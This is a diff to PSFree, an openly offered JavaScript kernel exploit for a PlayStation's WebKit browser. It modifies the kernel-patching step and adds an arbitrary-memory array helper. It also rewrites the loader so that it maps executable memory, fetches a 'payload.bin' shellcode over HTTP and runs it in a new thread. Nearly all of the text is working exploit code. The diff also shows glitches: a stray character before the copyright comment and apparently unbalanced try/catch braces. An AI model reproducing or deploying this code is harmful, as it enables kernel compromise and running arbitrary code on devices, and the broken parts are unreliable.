@@ -1,4 +1,4 @@
-/* Copyright (C) 2025 anonymous
+F/* Copyright (C) 2025 anonymous
 This file is part of PSFree.
 
 PSFree is free software: you can redistribute it and/or modify
@@ -1603,7 +1603,9 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     kmem.write64(sysent_661.add(8), sy_call);
     // .sy_thrcnt = SY_THR_STATIC
     kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
-    alert("kernel exploit succeeded!");
+    localStorage.ExploitLoaded="yes"
+    sessionStorage.ExploitLoaded="yes";
+   //alert("kernel exploit succeeded!");
 }
 
 
@@ -1624,20 +1626,6 @@ function setup(block_fd) {
         reqs1.write32(0x20 + i*0x28, block_fd);
     }
     aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
-
-    {
-        const reqs1 = make_reqs1(1);
-        const timo = new Word(1);
-        const id = new Word();
-        aio_submit_cmd(AIO_CMD_READ, reqs1.addr, 1, id.addr);
-        chain.do_syscall_clear_errno(
-            'aio_multi_wait', id.addr, 1, _aio_errors_p, 1, timo.addr);
-        const err = chain.errno;
-        if (err !== 60) { // ETIMEDOUT
-            die(`SceAIO system not blocked. errno: ${err}`);
-        }
-        free_aios(id.addr, 1);
-    }
 
     log('heap grooming');
     // chosen to maximize the number of 0x80 malloc allocs per submission
@@ -1709,21 +1697,19 @@ export async function kexploit() {
     await init();
     const _init_t2 = performance.now();
 
-    if(sessionStorage.getItem('binloader')){
-        runBinLoader();
-        return new Promise(() => {});
-    }
+   if (localStorage.ExploitLoaded === "yes" && sessionStorage.ExploitLoaded!="yes") {
+           runBinLoader();
+            return new Promise(() => {});
+      }
 
-    // If setuid is successful, we dont need to run the kexploit again
-    try {
-        if (sysi('setuid', 0) == 0) {
-            log("Not running kexploit again.");
-            runBinLoader();
-            return;
+     try {
+        chain.sys('setuid', 0);
         }
     }
-    catch (e) {}
-
+    catch (e) {
+        localStorage.ExploitLoaded = "no";
+    }
+ 
     // fun fact:
     // if the first thing you do since boot is run the web browser, WebKit can
     // use all the cores
@@ -1815,28 +1801,60 @@ function malloc32(sz) {
     ptr.backing = new Uint32Array(backing.buffer);
     return ptr;
 }
-
+function array_from_address(addr, size) {
+   var og_array = new Uint32Array(0x1000);
+    var og_array_i = mem.addrof(og_array).add(0x10);
+    mem.write64(og_array_i, addr);
+    mem.write32(og_array_i.add(0x8), size);
+    mem.write32(og_array_i.add(0xC), 0x1);
+    nogc.push(og_array);
+    return og_array;
+}
 
 kexploit().then(() => {
-    
-    window.pld_size = new Int(0x26200000, 0x9);
 
-    var payload_buffer = chain.sysp('mmap', window.pld_size, 0x300000, 7, 0x41000, -1, 0);
-    var payload = window.pld;
-    var bufLen = payload.length * 4
-    var payload_loader = malloc32(bufLen);
-    var loader_writer = payload_loader.backing;
-    for (var i = 0; i < payload.length; i++) {
-        loader_writer[i] = payload[i];
-    }
-    chain.sys('mprotect', payload_loader, bufLen, (0x1 | 0x2 | 0x4));
-    var pthread = malloc(0x10);
+ const PROT_READ = 1;
+ const PROT_WRITE = 2;
+ const PROT_EXEC = 4;
 
+var loader_addr = chain.sysp(
+  'mmap',
+  new Int(0, 0),                         
+  0x1000,                               
+  PROT_READ | PROT_WRITE | PROT_EXEC,    
+  0x41000,                              
+  -1,
+  0
+);
+
+ var tmpStubArray = array_from_address(loader_addr, 1);
+ tmpStubArray[0] = 0x00C3E7FF;
+
+ var req = new XMLHttpRequest();
+ req.responseType = "arraybuffer";
+ req.open('GET','payload.bin');
+ req.send();
+ req.onreadystatechange = function () {
+  if (req.readyState == 4) {
+   var PLD = req.response;
+   var payload_buffer = chain.sysp('mmap', 0, 0x300000, 7, 0x41000, -1, 0);
+   var pl = array_from_address(payload_buffer, PLD.byteLength*4);
+   var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
+   var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
+   tmp.set(new Uint8Array(req.response), 0);
+   tmp.set(padding, req.response.byteLength);
+   var shellcode = new Uint32Array(tmp.buffer);
+   pl.set(shellcode,0);
+   var pthread = malloc(0x10);
+   
     call_nze(
         'pthread_create',
         pthread,
         0,
-        payload_loader,
+        loader_addr,
         payload_buffer,
-    );
+    );	
+   }
+ };
+
 })
